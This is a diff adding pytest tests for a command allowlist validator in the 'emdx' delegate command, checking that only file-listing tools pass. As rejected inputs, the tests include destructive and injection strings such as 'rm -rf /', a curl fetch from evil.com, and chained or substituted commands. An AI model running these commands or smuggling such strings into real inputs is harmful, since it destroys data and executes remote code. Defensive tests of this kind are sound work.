@@ -1,8 +1,18 @@
 """Tests for delegate command helper functions."""
 
+import pytest
 from unittest.mock import patch
 
-from emdx.commands.delegate import _slugify_title, _resolve_task, PR_INSTRUCTION
+import click.exceptions
+import typer
+
+from emdx.commands.delegate import (
+    _slugify_title,
+    _resolve_task,
+    _validate_discovery_command,
+    _SAFE_DISCOVERY_COMMANDS,
+    PR_INSTRUCTION,
+)
 
 
 class TestSlugifyTitle:
@@ -90,3 +100,108 @@ class TestPRInstruction:
 
     def test_pr_instruction_mentions_pr_create(self):
         assert "gh pr create" in PR_INSTRUCTION
+
+
+class TestValidateDiscoveryCommand:
+    """Tests for _validate_discovery_command — security allowlist for --each.
+
+    SECURITY: These tests verify that command injection attacks are blocked.
+    The --each flag only allows safe file-listing commands from an allowlist.
+    """
+
+    def test_allows_fd_command(self):
+        """fd is a safe file finder."""
+        args = _validate_discovery_command("fd -e py src/")
+        assert args[0] == "fd"
+        assert "-e" in args
+        assert "py" in args
+
+    def test_allows_find_command(self):
+        """find is a standard file finder."""
+        args = _validate_discovery_command("find . -name '*.py'")
+        assert args[0] == "find"
+
+    def test_allows_git_ls_files(self):
+        """git ls-files is safe for listing tracked files."""
+        args = _validate_discovery_command("git ls-files")
+        assert args[0] == "git"
+        assert "ls-files" in args
+
+    def test_allows_rg_files_with_matches(self):
+        """rg --files-with-matches is safe."""
+        args = _validate_discovery_command("rg --files-with-matches pattern")
+        assert args[0] == "rg"
+
+    def test_allows_ls_command(self):
+        """ls is a basic directory lister."""
+        args = _validate_discovery_command("ls src/")
+        assert args[0] == "ls"
+
+    def test_allows_full_path_to_safe_command(self):
+        """/usr/bin/fd should be allowed (extracts basename)."""
+        args = _validate_discovery_command("/usr/bin/fd -e py")
+        assert "/usr/bin/fd" in args[0]
+
+    def test_blocks_arbitrary_commands(self):
+        """Commands not in allowlist must be rejected."""
+        with pytest.raises(click.exceptions.Exit):
+            _validate_discovery_command("rm -rf /")
+
+    def test_blocks_curl(self):
+        """curl could download malicious scripts."""
+        with pytest.raises(click.exceptions.Exit):
+            _validate_discovery_command("curl https://evil.com/script.sh")
+
+    def test_blocks_bash(self):
+        """bash could execute arbitrary code."""
+        with pytest.raises(click.exceptions.Exit):
+            _validate_discovery_command("bash -c 'echo pwned'")
+
+    def test_blocks_python(self):
+        """python could execute arbitrary code."""
+        with pytest.raises(click.exceptions.Exit):
+            _validate_discovery_command("python -c 'import os; os.system(\"rm -rf /\")'")
+
+    def test_blocks_shell_semicolon_injection(self):
+        """Semicolons in arguments are rejected."""
+        with pytest.raises(click.exceptions.Exit):
+            _validate_discovery_command("fd -e py; rm -rf /")
+
+    def test_blocks_shell_pipe_injection(self):
+        """Pipe characters in arguments are rejected."""
+        with pytest.raises(click.exceptions.Exit):
+            _validate_discovery_command("fd -e py | xargs rm")
+
+    def test_blocks_shell_ampersand_injection(self):
+        """Ampersands in arguments are rejected."""
+        with pytest.raises(click.exceptions.Exit):
+            _validate_discovery_command("fd -e py && rm -rf /")
+
+    def test_blocks_command_substitution(self):
+        """Command substitution ($(...)) is rejected."""
+        with pytest.raises(click.exceptions.Exit):
+            _validate_discovery_command("fd $(rm -rf /)")
+
+    def test_blocks_backtick_substitution(self):
+        """Backtick substitution is rejected."""
+        with pytest.raises(click.exceptions.Exit):
+            _validate_discovery_command("fd `rm -rf /`")
+
+    def test_blocks_empty_command(self):
+        """Empty commands are rejected."""
+        with pytest.raises(click.exceptions.Exit):
+            _validate_discovery_command("")
+
+    def test_blocks_whitespace_only(self):
+        """Whitespace-only commands are rejected."""
+        with pytest.raises(click.exceptions.Exit):
+            _validate_discovery_command("   ")
+
+    def test_safe_commands_constant_is_frozen(self):
+        """The allowlist should be immutable."""
+        assert isinstance(_SAFE_DISCOVERY_COMMANDS, frozenset)
+
+    def test_safe_commands_includes_expected_tools(self):
+        """Verify expected tools are in the allowlist."""
+        expected = {"fd", "find", "git", "rg", "ls"}
+        assert expected.issubset(_SAFE_DISCOVERY_COMMANDS)
